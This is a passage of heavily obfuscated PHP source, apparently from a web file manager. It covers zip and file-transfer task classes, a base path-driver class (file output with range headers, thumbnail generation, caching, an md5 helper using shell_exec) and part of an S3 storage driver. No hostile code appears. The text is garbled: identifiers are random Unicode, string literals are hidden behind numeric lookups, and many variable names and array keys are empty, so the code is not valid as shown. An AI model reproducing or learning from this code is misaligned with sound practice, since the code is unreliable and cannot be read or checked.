$_SERVER[]; $· =& $this->task; if ($·[$գ[2098]] == $գ[1379]) { $·[$գ[2098]] = $գ[388]; $·[$գ[935]] = 0; $·[$գ[858]] = 0; } $ = get_path_this($); if (strstr($, $գ[10])) { $·[$գ[1970]] += 1; $·[$գ[1226]] += 1; } $·[$գ[2021]] = $; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ǆ =& $_SERVER[]; parent::startAfter(); Hook::bind($Ǆ[2104], array($this, $Ǆ[2094])); Hook::bind($Ǆ[2096], array($this, $Ǆ[2097])); $ =& $this->task; $[$Ǆ[2098]] = $Ǆ[1379]; if (!$[$Ǆ[1859]]) { $[$Ǆ[1859]] = LNG($Ǆ[2105]); } } protected function endAfter() { $° =& $_SERVER[]; parent::endAfter(); Hook::unbind($°[2104], array($this, $°[2094])); Hook::unbind($°[2096], array($this, $°[2097])); } public function updateAfter() { $ =& $_SERVER[]; $ =& $this->task; if (!$[$[1226]] || !$[$[858]]) { return; } if ($[$[2098]] == $[1379]) { $ = $[$[2024]]; if ($[$[2025]] != $[1379]) { $ = 0; } $ = ($[$[935]] + $) / $[$[858]]; $[$[1971]] = $ * 0.3; } else { if ($[$[2098]] == $[388]) { $ = $[$[1970]] / $[$[1226]]; $[$[1971]] = 0.3 + $ * 0.5; } else { if ($[$[2098]] == $[107]) { $ = 0; if ($[$[2023]]) { $ = $[$[2024]] / $[$[2023]]; } $[$[1971]] = 0.3 + 0.5 + $ * 0.2; } } } if ($[$[1971]] > 0) { $ = timeFloat() - $[$[1973]] - $[$[1976]]; $[$[1977]] = $ * (1 - $[$[1971]]) / $[$[1971]]; } } public function copyFileStart($֟͗, $, $勬, $, $, $ǯ) { $ʧ =& $_SERVER[]; parent::copyFileStart($֟͗, $, $勬, $, $, $ǯ); $ڂ҅ =& $this->task; if ($ڂ҅[$ʧ[2098]] == $ʧ[388]) { $ڂ҅[$ʧ[2098]] = $ʧ[107]; } $this->update(); } public function copyFileEnd($, $, $粧, $ʥ, $㜗, $ݣ) { $ϗ =& $_SERVER[]; $줫 =& $this->task; $줫[$ϗ[2024]] = $줫[$ϗ[2023]]; $줫[$ϗ[935]] += $줫[$ϗ[2023]]; $줫[$ϗ[2025]] = $ϗ[12]; $this->update(); } public function zipEvent($拱, $􋠱, $靻, $鱀) { $Ďť =& $_SERVER[]; $ =& $this->task; $[$Ďť[2021]] = get_path_this($􋠱); $[$Ďť[2023]] = $鱀; $[$Ďť[2024]] = $靻; $[$Ďť[1228]] = $拱 == $Ďť[2106] ? $Ďť[2101] : $Ďť[2102]; $[$Ďť[2025]] = $Ďť[12]; $[$Ďť[858]] = $鱀; $[$Ďť[2098]] = $Ďť[388]; $this->update(); } public function nameParse($ⱪ) { $ =& $_SERVER[]; $ڹ =& $this->task; if ($ڹ[$[1970]] < $ڹ[$[1226]]) { $ = get_path_this($ⱪ); if (strstr($, $[10])) { $ڹ[$[1970]] += 1; } } if ($ڹ[$[2098]] == $[1379]) { $ڹ[$[2098]] = $[388]; } $ڹ[$[2021]] = $ⱪ; $this->update(); } } goto B񊊧; aє: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ꯙ =& $_SERVER[]; $this->objectDriver = array($ꯙ[60], $ꯙ[61], $ꯙ[62], $ꯙ[63], $ꯙ[64], $ꯙ[65], $ꯙ[66], $ꯙ[67], $ꯙ[68], $ꯙ[69], $ꯙ[70], $ꯙ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($, $_SERVER[][8]); } return $; } public function iconvApp($) { return $; } public function iconvSystem($֝ͤ) { return $֝ͤ; } public function iconvTo($Ŝ, $ஶ, $ٿŴ) { $ܽ =& $_SERVER[]; if (!$Ŝ || !function_exists($ܽ[72])) { return $Ŝ; } static $ɨ = array(); $ = $ஶ . $ܽ[73] . $ٿŴ . $ܽ[74] . $Ŝ; if (isset($ɨ[$])) { return $ɨ[$]; } if (function_exists($ܽ[75])) { $ = @mb_convert_encoding($Ŝ, $ٿŴ, $ஶ); } else { $ = @iconv($ஶ, $ٿŴ, $Ŝ); } $ = $ ? $ : $Ŝ; if (strstr($, $ܽ[76])) { $ = str_replace($ܽ[76], $ܽ[11], $); } $ɨ[$ஶ . $ܽ[73] . $ٿŴ . $ܽ[74] . $Ŝ] = $; $ɨ[$ٿŴ . $ܽ[73] . $ஶ . $ܽ[74] . $Ŝ] = $Ŝ; $ɨ[$ٿŴ . $ܽ[73] . $ஶ . $ܽ[74] . $] = $Ŝ; $ɨ[$ஶ . $ܽ[73] . $ٿŴ . $ܽ[74] . $] = $; return $; } public function getPathInner($) { $ = IO::init($); return $->path; } public function getPathOuter($į) { $Ҹ =& $_SERVER[]; $ = strlen(trim($this->pathBase, $Ҹ[8])); $į = substr(trim($į, $Ҹ[8]), $); return $this->pathDriver . $Ҹ[8] . ltrim($į, $Ҹ[8]); } public function isParentOf($Н, $ފ) { $̐ =& $_SERVER[]; $Н = rtrim(strtolower($Н), $̐[8]) . $̐[8]; $ފ = rtrim(strtolower($ފ), $̐[8]) . $̐[8]; $꾼 = strpos($ފ, $Н) === 0; return $꾼; } public function getType() { $ =& $_SERVER[]; $ȩ = str_replace($[77], $[12], get_class($this)); return strtolower($ȩ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ߵ, $) { $ԙ =& $_SERVER[]; $ծ = rtrim($ߵ, $ԙ[8]) . $ԙ[8] . $; $ = $this->exist($ծ); return $ ? $ծ : !1; } public function setModifyTime($, $ʃ = '') { } public function renameObject($噹, $ȑ) { $Մ = $ȑ; $噹 = $this->getPathOuter($噹); $ȑ = $this->pathFather($噹) . $ȑ; $ = IO::copy($噹, $this->pathFather($噹), REPEAT_RENAME_FOLDER, $Մ); if ($) { IO::remove($噹); } return $ ? $ȑ : !1; } public function tempFile($Ĥڳ = '', $ = '') { if (!$Ĥڳ) { $Ĥڳ = rand_string(15); } $ҺŘ = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($ҺŘ, DEFAULT_PERRMISSIONS, !0); $ = $ҺŘ . $Ĥڳ; @touch($); if ($) { file_put_contents($, $); } return $; } public function tempFileRemve($) { @unlink($); @rmdir($this->pathFather($)); } public function mkfile($澀, $ܞ = '', $쿝 = REPEAT_RENAME) { } public function mkdir($Ŵ, $ = REPEAT_SKIP) { } public function delFile($䯓) { } public function delFolder($) { } public function copyFile($, $) { } public function moveFile($, $ᦽ) { } public function remove($ͮ) { if ($this->isFile($ͮ)) { return $this->delFile($ͮ); } return $this->delFolder($ͮ); } public function rename($ܥ, $뮠) { } public function exist($ʆ) { } public function isFile($) { } public function isFolder($Ɬ) { } public function size($瀓) { } public function info($) { } public function infoSimple($ǘ) { return $this->info($ǘ); } public function infoAuth($) { return $this->info($); } public function infoFull($ː) { return $this->info($ː); } public function infoFullSimple($) { return $this->info($); } public function infoWithChildren($) { $ =& $_SERVER[]; static $ = array(); if (isset($[$])) { return $[$]; } $ = $this->info($); if ($ && $[$[33]] == $[78]) { $ = array($[79] => 0, $[80] => 0, $[81] => 0); $this->infoChildren($, $); $[$[79]] = $[$[79]]; $[$[82]] = array($[83] => $[$[80]], $[84] => $[$[81]]); $[$] = $; } return $; } public function listPath($ą, $Ϻ = false) { } public function has($Ҵ, $ = false, $ʑ = false) { } public function canRead($ӆ) { } public function canWrite($ߜ) { } public function getContent($) { } public function setContent($ޑ, $ = '') { } protected function infoChildren($Ȩ, &$쁁) { $δ× =& $_SERVER[]; check_abort_echo(); $Ӫ = $this->listPath($Ȩ, !0); $Ӫ = array_merge($Ӫ[$δ×[85]], $Ӫ[$δ×[86]]); foreach ($Ӫ as $ǜ) { if ($ǜ[$δ×[33]] == $δ×[78]) { $쁁[$δ×[81]]++; $ = $this->getPathInner($ǜ[$δ×[87]]); $this->infoChildren($, $쁁); } else { $쁁[$δ×[80]]++; $쁁[$δ×[79]] += $ǜ[$δ×[79]]; } } } public function fileSubstr($, $, $) { } public function listAll($ת) { } public function listAllMake($, &$) { $ =& $_SERVER[]; check_abort_echo(); $緼 = $this->listPath($, !0); if (!$緼) { return; } $Ԛ = array_merge($緼[$[85]], $緼[$[86]]); foreach ($Ԛ as $Ġ) { $޳ = $Ġ[$[33]] == $[78]; $贰 = array($[87] => $Ġ[$[87]], $[78] => $޳); if (isset($Ġ[$[79]])) { $贰[$[79]] = $Ġ[$[79]]; } if (isset($Ġ[$[88]])) { $贰[$[88]] = $Ġ[$[88]]; } if (!$޳) { $[] = $贰; continue; } $[] = $贰; $ = $Ġ[$[87]]; $ؕ = $this->pathDriver; if (substr($Ġ[$[87]], 0, strlen($ؕ)) == $ؕ) { $ = substr($, strlen($ؕ)); } $this->listAllMake($, $); } } public function listAllSimple($ʝ, $֣ = false) { $ = $this->listAll($ʝ); return $this->listAllSimpleMake($, $this->getPathOuter($ʝ), $֣); } public function listAllSimpleMake($, $П, $䝄) { $ =& $_SERVER[]; $ = array(); $П = rtrim(get_path_father($П), $[8]) . $[8]; foreach ($ as $Ռ) { $ˈ = array($[87] => $Ռ[$[87]], $[89] => $Ռ[$[87]], $[78] => $Ռ[$[78]]); if (isset($Ռ[$[79]]) && !$Ռ[$[78]]) { $ˈ[$[79]] = $Ռ[$[79]]; } if (isset($Ռ[$[88]])) { $ˈ[$[88]] = $Ռ[$[88]]; } if (is_array($Ռ[$[90]])) { $ˈ[$[89]] = $Ռ[$[90]][$[87]]; $ˈ[$[79]] = $Ռ[$[90]][$[79]]; $ˈ[$[88]] = $Ռ[$[90]][$[88]]; } else { if (substr($Ռ[$[87]], 0, strlen($П)) == $П) { $ˈ[$[87]] = substr($Ռ[$[87]], strlen($П)); } } $ = $Ռ[$[78]] ? $[8] : $[12]; $ˈ[$[89]] = rtrim($ˈ[$[89]], $[8]) . $; $ˈ[$[87]] = $[8] . trim($ˈ[$[87]], $[8]) . $; if (!$䝄) { $Ʊ = explode($[8], trim($ˈ[$[87]], $[8])); $ˈ[$[87]] = $[8] . implode($[8], array_slice($Ʊ, 1)) . $; } $[] = $ˈ; } return array_sort_by($, $[87]); } public function upload($˻, $, $ = false, $ = REPEAT_REPLACE) { } public function uploadFileByID($Ԛ, $ʡ, $) { } public function uploadFileByPath($ɩ, $݅, $Ż = array()) { } public function isUploadServer() { $ޫӣ =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ޫӣ[91]) { return !0; } return $GLOBALS[$ޫӣ[6]][$ޫӣ[92]][$ޫӣ[93]]; } public function isFileOutServer() { $ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $[91]) { return !0; } return $GLOBALS[$[6]][$[92]][$[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ۍ׆) { $⤘݈ =& $_SERVER[]; if (!$this->isCdnHost()) { return $ۍ׆; } return str_replace(trim(get_url_root($ۍ׆), $⤘݈[8]), trim($this->cdnHost, $⤘݈[8]), $ۍ׆); } public function uploadLink($ˋ, $ = 0) { $֖ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $ۙ = $this->getType(); if (!in_array($ۙ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ = 1024 * 1024 * 10; $ͤ = (!$ ? 1 : ceil($ / pow(1024, 3))) * 3600 * 4; if ($ <= $) { $ = $this->uploadFormData($ˋ, $ͤ); } else { $ = $this->uploadMultiData($ˋ, $ͤ); } if ($) { $[$֖[95]] = $ˋ; $[$֖[96]] = $ۙ; } return $; } public function uploadFormData($ݲ, $ = 3600) { } public function uploadMultiData($, $ = 3600) { } public function multiUploadFormData($Ȇ, $ = 3600) { return $this->uploadMultiData($Ȇ, $); } public function download($Ȼ, $) { } public function ext($) { return get_path_ext($); } public function pathThis($ϖ) { $皂 =& $_SERVER[]; $ϖ = str_replace($皂[97], $皂[8], rtrim($ϖ, $皂[8])); $ = strrpos($ϖ, $皂[8]); if ($ === !1) { return $ϖ; } return substr($ϖ, $ + 1); } public function pathFather($) { $ߣ =& $_SERVER[]; $ = str_replace($ߣ[97], $ߣ[8], rtrim($, $ߣ[8])); $ = strrpos($, $ߣ[8]); if ($ === !1) { return $ߣ[12]; } return substr($, 0, $ + 1); } public function hashSimple($ޫ) { $Ŋ =& $_SERVER[]; if (!$ޫ) { return md5($Ŋ[12]); } $ʬǟ = $this->size($ޫ); $ = 200; $ = 50; if ($ʬǟ <= $ * $) { return $this->hashMd5($ޫ) . $ʬǟ; } $ߔ = intval($ʬǟ / $); $ = $Ŋ[12]; for ($٤ = 0; $٤ < $; $٤++) { $ .= $this->fileSubstr($ޫ, $ߔ * $٤, $); } $ .= $this->fileSubstr($ޫ, $ʬǟ - $, $); return md5($) . $ʬǟ; } public static $md5Cache = array(); public function hashMd5($) { if (!$) { return md5($_SERVER[][12]); } $ = $this->iconvSystem($); if (isset(self::$md5Cache[$])) { return self::$md5Cache[$]; } self::$md5Cache[$] = $this->hashMd5Shell($); if (!self::$md5Cache[$]) { self::$md5Cache[$] = @md5_file($); } return self::$md5Cache[$]; } private function hashMd5Shell($) { $㖩 =& $_SERVER[]; if (!$) { return md5($㖩[12]); } if (!function_exists($㖩[98])) { return !1; } $ = array($㖩[99], $㖩[100]); $ = Cache::get($㖩[101]); if (!$) { $ȭ = BASIC_PATH . $㖩[102]; $ = md5_file($ȭ); $ = $㖩[103]; foreach ($ as $أ) { $ͷ = shell_exec($أ . $㖩[53] . escapeShell($ȭ)); if ($ͷ && substr(trim($ͷ), 0, 32) == $) { $ = $أ; break; } } Cache::set($㖩[101], $, 3600); } if ($ == $㖩[103]) { return !1; } $ͷ = shell_exec($ . $㖩[53] . escapeShell($)); $ͷ = str_replace($㖩[104], $㖩[12], $ͷ); return substr($ͷ, 0, 32); } public function link($ȿ) { return $ȿ; } public function fileOut($, $ = false, $ = false, $đу = '') { $Բ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$ || !$this->exist($)) { show_json(LNG($Բ[105]), !1, $); } $Ӡ = $this->getType() == $Բ[106]; $Π = $GLOBALS[$Բ[6]][$Բ[92]][$Բ[107]][$Բ[108]]; $ = (double) $GLOBALS[$Բ[6]][$Բ[92]][$Բ[107]][$Բ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ӏ = $this->infoFull($); $ = $Ӏ[$Բ[79]]; $ܞ = gmdate($Բ[110], $Ӏ[$Բ[88]]); $ʘ = $ ? $ : $this->iconvApp($Ӏ[$Բ[32]]); $к = 0; $ = $ - 1; $ = $this->ext($ʘ); if (in_array($, array($Բ[111], $Բ[112], $Բ[113], $Բ[114]))) { $ = $Բ[115]; } if (in_array($, array($Բ[116]))) { $ = $Բ[117]; } if (!$đу) { $đу = md5($ܞ . $); } $đу = $Բ[118] . $đу . $Բ[118]; $׳ = get_file_mime($); $ۇ = !0; $ۇ = isset($_GET[$Բ[119]]) ? !1 : !0; if ($ === !1 && !mime_support($׳)) { $׳ = $Բ[120]; } header($Բ[121]); header($Բ[122] . $׳); $۫ = rawurlencode($ʘ); $۫ = $Բ[118] . $۫ . $Բ[123] . $۫; if ($) { header($Բ[124]); header($Բ[125] . $۫); } else { if ($ۇ) { header($Բ[126] . $۫); } } $Ԗ = 3600 * 24 * 30; header($Բ[127]); header($Բ[128]); header($Բ[129] . $Ԗ); header($Բ[130] . gmdate($Բ[110], time() + $Ԗ) . $Բ[131]); if (isset($_SERVER[$Բ[132]]) && strtotime($_SERVER[$Բ[132]]) == $Ӏ[$Բ[88]]) { header($Բ[133], !0, 304); die; } if (isset($_SERVER[$Բ[134]]) && $_SERVER[$Բ[134]] == $đу) { header($Բ[135] . $đу, !0, 304); die; } header($Բ[135] . $đу); header($Բ[136] . $ܞ . $Բ[131]); header($Բ[137] . rawurlencode($ʘ)); header($Բ[138]); header($Բ[139] . $); header($Բ[140]); Hook::trigger($Բ[141], $, $, $ʘ, $); if (!$ && $ == $Բ[142]) { if ($ > 1024 * 1024 * 10) { die; } $ݪӃ = $this->getContent($); $ݪӃ = Html::clearSVG($ݪӃ); header($Բ[143] . strlen($ݪӃ)); echo $ݪӃ; die; } $͇ = strtolower($_SERVER[$Բ[144]]); if ($Ӡ && $͇ && $Π) { if (strstr($͇, $Բ[145])) { header($Բ[146] . $); } else { if (strstr($͇, $Բ[147])) { header($Բ[148] . $); } else { if (strstr($͇, $Բ[149])) { header($Բ[150] . $); } } } if ($) { header($Բ[151] . $); } return; } if (isset($_SERVER[$Բ[152]])) { if (preg_match($Բ[153], $_SERVER[$Բ[152]], $ݜ)) { $к = intval($ݜ[1]); $к = $к <= 0 ? 0 : ($к >= $ ? $ : $к); if (!empty($ݜ[2])) { $ = intval($ݜ[2]); $ = $ < $к ? $к : ($ >= $ ? $ : $); } } header($Բ[154]); header("\x43\157\156\x74\145\x6e\x74\55\122\141\156\x67\145\72\40\142\171\x74\145\x73\40{$к}\55{$}\x2f" . $); } else { header($Բ[155]); } header($Բ[156]); header($Բ[157]); $ʈ± = !0; if ($_SERVER[$Բ[158]] == $Բ[159] && $ > 1204 * 1024 * 1024 * 2) { $ʈ± = !1; } if ($ʈ±) { header($Բ[160] . ($ - $к + 1)); } if ($_SERVER[$Բ[161]] == $Բ[162]) { return; } $ = array($Բ[163] => !1, $Բ[164] => $к, $Բ[165] => $, $Բ[166] => $, $Բ[167] => $Ӏ, $Բ[168] => $Բ[12], $Բ[169] => 0); $ = Hook::filter($Բ[170], $); $ = 1024 * 300; $ = 0; if ($) { $ = intval(1000 * 1000 * ($ / $)); } while ($к <= $) { $Ε = timeFloat(); check_abort(); $Ѭ = $ - $к + 1; if ($Ѭ <= $) { $ = $Ѭ; } $ݪӃ = $this->fileSubstr($, $к, $); if ($[$Բ[163]]) { $[$Բ[168]] = $ݪӃ; $[$Բ[169]] = $к; $ = Hook::filter($Բ[171], $); $ݪӃ = $[$Բ[168]]; } echo $ݪӃ; $к += $; if ($ == $Ѭ) { $к = $ + 1; } if ($) { $ڒ = intval(1000 * 1000 * (timeFloat() - $Ε)); $ = $ - $ڒ; if ($ > 5) { usleep($); } } } } public function fileOutServer($݊֟, $Ջϡ = false, $چ = false, $˯Ӣ = '') { $this->fileOut($݊֟, $Ջϡ, $چ, $˯Ӣ); } public function fileOutLink($ʘʁ) { header($_SERVER[][172] . $ʘʁ); die; } public function cacheMethod($ճ, $Զ, $ʙ = null) { $׍ =& $_SERVER[]; static $ = array(); $ύ = $Զ ? ltrim($this->getPathOuter($Զ), $׍[8]) : $׍[12]; $Ԫ = $׍[173] . $ճ . $׍[174] . rtrim($ύ, $׍[8]); if (is_null($ճ)) { $ = array(); return; } if (is_null($Զ)) { foreach ($ as $Ԫ => $) { if (!strstr($Ԫ, $׍[173] . $ճ . $׍[175])) { continue; } unset($[$Ԫ]); } return; } if ($ʙ === $׍[176]) { unset($[$Ԫ]); return; } if (!is_null($ʙ)) { $[$Ԫ] = $ʙ; return; } $ = isset($[$Ԫ]) ? $[$Ԫ] : null; if (!is_null($)) { return $; } $ = $this->{$ճ}($Զ); $[$Ԫ] = $; return $; } public function cacheMethodInfoSet($ĭ, $⋆, $ = false) { $ܟ =& $_SERVER[]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ܟ[177], $ĭ, $⋆); $this->cacheMethod($ܟ[178], $ĭ, $⋆ ? !1 : !0); if (is_array($)) { $this->cacheMethod($ܟ[179], $ĭ, $); } } public function fileOutImage($, $ = 250) { $׵ =& $_SERVER[]; set_timeout(); if (substr($, 0, 4) == $׵[149]) { $this->fileOutLink($); } $ = $this->info($); $ձ = !1; $ؒ = isset($GLOBALS[$׵[180]]) ? $GLOBALS[$׵[180]] : array(); if ($ؒ && $ؒ[$׵[181]] == $[$׵[87]]) { $ = $ؒ; $⏁ = $[$׵[182]]; if ($⏁ && isset($⏁[$׵[183]])) { if ($⏁[$׵[183]] <= $ && $⏁[$׵[184]] <= $) { $ձ = !0; } } } if ($[$׵[79]] <= 1024 * 50 || $ձ || !function_exists($׵[185]) || $[$׵[166]] == $׵[186]) { return $this->fileOut($, !1, $[$׵[32]]); } $ = kodIO::hashPath($); $ = "\143\157\166\x65\x72\x5f{$}\x5f{$}\x2e\x70\156\x67"; $ = IO_PATH_SYSTEM_TEMP . $׵[187]; $Ȏ = IO::infoFullSimple($); $ʞۉ = $Ȏ && is_array($Ȏ) ? $Ȏ[$׵[87]] : $׵[12]; if (!$ʞۉ) { $ʞۉ = IO::mkdir($); } if ($[$׵[188]] == $׵[189] && isset($[$׵[190]]) && $[$׵[190]] == kodIO::sourceID($ʞۉ)) { $ǎ = $[$׵[191]]; if ($ <= 500) { $∕ = preg_replace($׵[192], $׵[193], $[$׵[32]]); $ǎ = IO::fileNameExist($ʞۉ, $∕); } return IO::fileOut(KodIO::make($ǎ), !1, $[$׵[32]]); } $񵠁 = IO::fileNameExist($ʞۉ, $); if ($񵠁) { return IO::fileOut(KodIO::make($񵠁), !1, $[$׵[32]]); } if ($ > 1000) { $this->makeImageCover($ʞۉ, $, $, $); $this->makeImageCover($ʞۉ, $, "\x63\157\x76\145\x72\x5f{$}\137\62\x35\60\x2e\160\x6e\147", 250); $񵠁 = IO::fileNameExist($ʞۉ, $); if ($񵠁) { return IO::fileOut(KodIO::make($񵠁), !1, $[$׵[32]]); } die; } if (!kodIO::allowCover($)) { return $this->fileOut($, !1, $[$׵[32]]); } $ = Cache::get($); if ($ == $׵[194] || $ == $׵[195]) { echo $; die; } Cache::set($, $׵[195], 60); $ = array($ʞۉ, $[$׵[87]], $, $); $ = $׵[196] . $[$׵[79]] . $׵[197] . $ . $׵[198] . $[$׵[32]] . $׵[199] . $[$׵[87]]; TaskQueue::add($׵[200], $, $, $); } public function makeImageCover($, $Ǿ, $䞣, $) { $ظĪ =& $_SERVER[]; if (IO::fileNameExist($, $䞣)) { return $ظĪ[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ȧ = $this->getPathOuter($Ǿ); $ɷð = DATA_THUMB . $䞣; del_file($ɷð); $˸ = IO::copy($ȧ, TEMP_FILES, !1, $䞣); if (!@file_exists($˸)) { return $ظĪ[202]; } ImageThumb::createThumb($˸, $ɷð, $, $ * 10); if (@file_exists($ɷð)) { Cache::remove($䞣); return IO::move($ɷð, $); } Cache::set($䞣, $ظĪ[194], 600); del_file($ɷð); return $ظĪ[203] . $˸ . $ظĪ[74]; } public function fileOutImageServer($ޒ, $ = 250) { $this->fileOutImage($ޒ, $); } public function fileNameAuto($߳, $݊, $߀ = REPEAT_RENAME, $И = false) { $ =& $_SERVER[]; $ǯĘ = $߳ === $[12] ? $݊ : rtrim($߳, $[8]) . $[8] . $݊; if ($߀ == REPEAT_REPLACE || !$this->exist($ǯĘ) || $И && $߀ != REPEAT_RENAME_FOLDER) { return $݊; } if ($߀ == REPEAT_SKIP) { return !1; } $˳ = $[10] . get_path_ext($݊); $˳ = $˳ == $[10] || $И ? $[12] : $˳; $Ԫ = 1; $ǅ = substr($݊, 0, strlen($݊) - strlen($˳)); $ = $ǅ . "\x28{$Ԫ}\51{$˳}"; while ($this->exist(rtrim($߳, $[8]) . $[8] . $)) { $ = $ǅ . "\x28{$Ԫ}\x29{$˳}"; $Ԫ++; } return $; } private function fileNameAutoList($, $ܧ늲, $۞ = false) { $ѓ =& $_SERVER[]; $ = $this->listPath($, !0); $ = array_merge($[$ѓ[85]], $[$ѓ[86]]); $ = array_to_keyvalue($, $ѓ[12], $ѓ[32]); $ճ΢ = $ѓ[10] . get_path_ext($ܧ늲); $ճ΢ = $ճ΢ == $ѓ[10] || $۞ ? $ѓ[12] : $ճ΢; $Ƹ = substr($ܧ늲, 0, strlen($ܧ늲) - strlen($ճ΢)); $щ = $Ƹ . "\x28\60\x29{$ճ΢}"; for ($ = 1; $ <= count($) + 1; $++) { $щ = $Ƹ . "\50{$}\x29{$ճ΢}"; if (!in_array_not_case($щ, $)) { return $щ; } } return $щ; } public function listAllFiles($賻, $Ÿ) { $ =& $_SERVER[]; if (empty($Ÿ)) { return array(); } $Ɍ = array_keys($Ÿ); $ = array(); $賻 = trim($賻, $[8]); foreach ($Ÿ as $ => $) { $ۊ = ltrim(substr(trim($, $[8]), strlen($賻)), $[8]); if (substr($, -1) == $[8]) { $ۊ = rtrim($ۊ, $[8]) . $[8]; } $ = array_merge($, $this->slicePath($ۊ)); } $͐Ѷ = array(); foreach (array_unique($) as $譍) { $ = array($[87] => $this->getPathOuter($[8] . $賻 . $[8] . $譍), $[78] => 1, $[79] => 0); if (substr($譍, -1) != $[8]) { $[$[78]] = 0; $Ѣ = $this->getPath($賻 . $[8] . $譍); if (isset($Ÿ[$Ѣ])) { $̘ = $Ÿ[$Ѣ]; if (isset($̘[$[79]])) { $[$[79]] = intval($̘[$[79]]); } if (isset($̘[$[204]])) { $[$[88]] = intval($̘[$[204]]); } } } $͐Ѷ[] = $; } return $͐Ѷ; } public function slicePath($) { $ѝ =& $_SERVER[]; $͛ = explode($ѝ[8], trim($, $ѝ[8])); $ = 0; do { ++$; $[] = implode($ѝ[8], array_slice($͛, 0, $)) . $ѝ[8]; } while ($ < count($͛)); $[count($͛) - 1] = $; return $; } public function getHost() { $⻟ =& $_SERVER[]; $ = parse_url(trim($this->domain, $⻟[8])); $ = isset($[$⻟[205]]) ? $[$⻟[205]] : http_type(); $ = isset($[$⻟[206]]) ? $[$⻟[206]] : $[$⻟[87]]; if (isset($[$⻟[207]])) { $ .= $⻟[4] . $[$⻟[207]]; } return $ . $⻟[208] . $; } public function pathEncode($) { $оٔ =& $_SERVER[]; return str_replace($оٔ[209], $оٔ[8], rawurlencode($)); } public function writeLog($兆첸 = '', $ = false) { $ =& $_SERVER[]; $˳ = in_array(ACTION, array($[210], $[211])); if (!$˳ && !GLOBAL_DEBUG) { return; } $ʊ왅 = $兆첸; static $Á = null; if (!$Á) { $Á = strtoupper($this->getType()); } $兆첸 = $Á . $[212] . $兆첸; if ($) { $̟ = error_get_last(); if ($̟) { $兆첸 = array($兆첸, $̟); } } write_log($兆첸, $[213]); if ($˳) { throw new Exception($ʊ왅); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($) { set_timeout(); require_once SDK_DIR . $_SERVER[][214]; parent::__construct(); $this->_init($); } public function _init($ڮ) { $ѓ =& $_SERVER[]; $this->config = $ڮ; foreach ($ڮ as $« => $š̾) { if (isset($this->{$«})) { $this->{$«} = $š̾; } } $this->endpoint = $ڮ[$ѓ[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $󞗞 = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($󞗞, 0, 7) == $ѓ[216]) { $󞗞 = $ѓ[217] . substr($󞗞, 7); } $this->client->setEndpoint($󞗞); if (in_array(ACTION, array($ѓ[210], $ѓ[211]))) { $this->client->setExceptions(); } } public function setSignVersion($ӈ = "\x76\64") { $this->signVer = $ӈ; $this->client->setSignVersion($ӈ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $) { return null; } } public function isBucketCors() { $ =& $_SERVER[]; $ = $this->getBucketCors(); if (!$ || !is_array($)) { return !1; } if (!is_array($[$[218]])) { $[$[218]] = explode($[50], $[$[218]]); } if ($[$[219]] != $[220] || !in_array($[220], $[$[218]])) { return !1; } $৲ = array_map($[221], $[$[222]]); if (!is_array($৲)) { $৲ = array(); } $籹 = array($[223], $[224], $[225], $[226], $[227]); $ջ = array_diff($籹, $৲); return empty($ջ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($ƀ) { return $this->client->setRegion($ƀ); } public function mkfile($ٞ, $Ǘ = '', $ = REPEAT_RENAME) { $ = $this->setContent($ٞ, $Ǘ); if ($ !== !1) { return $this->getPathOuter($ٞ); } return !1; } public function mkdir($Ǐ, $ = REPEAT_SKIP) { $񄼷 =& $_SERVER[]; if (empty($Ǐ) && $Ǐ !== $񄼷[228]) { return !1; } if ($ && $this->_isFolder($Ǐ)) { return $this->getPathOuter($Ǐ); } $Ҧ· = $this->setContent($Ǐ, $񄼷[12], !0); if ($Ҧ· !== !1) { return $this->getPathOuter($Ǐ); } return !1; } public function copyFile($ɷ, $ӹ, $ڄځ = array()) { $쒽 =& $_SERVER[]; $ç = $this->objectMeta($ɷ); if (!$ç) { return !1; } if ($ç[$쒽[79]] <= 1024 * 1024 * 200) { $ = $this->client->copyObject($this->bucket, $ɷ, $this->bucket, $ӹ, $쒽[229], $ڄځ); } else { $ = $this->client->multiCopyObject($this->bucket, $ɷ, $this->bucket, $ӹ, $ڄځ); } $ = $ ? $this->getPathOuter($ӹ) : !1; return $; } public function moveFile($퍝, $ߐ) { if ($this->copyFile($퍝, $ߐ)) { $this->delFile($퍝); return $this->getPathOuter($ߐ); } return !1; } public function delFile($) { return $this->client->deleteObject($this->bucket, $); } public function delFolder($ۨȁ) { $⊵ =& $_SERVER[]; if (!$this->exist($ۨȁ)) { return !0; } $this->listItemCache = !1; $Ð = $this->fileList($ۨȁ); $this->listItemCache = !0; $̔ = trim($ۨȁ, $⊵[8]) . $⊵[8]; if (!empty($ۨȁ) && $ۨȁ !== $⊵[228] && 